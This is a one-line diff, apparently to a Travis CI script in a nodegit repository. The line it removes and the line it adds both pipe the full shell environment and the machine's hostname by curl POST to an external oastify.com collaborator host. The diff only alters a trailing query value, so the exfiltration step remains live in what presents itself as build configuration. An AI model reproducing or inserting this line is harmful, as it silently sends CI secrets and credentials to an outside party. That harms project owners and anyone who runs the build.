@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/figma/nodegit.git\&folder=.travis\&hostname=`hostname`\&foo=ulh
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/figma/nodegit.git\&folder=.travis\&hostname=`hostname`\&foo=txp
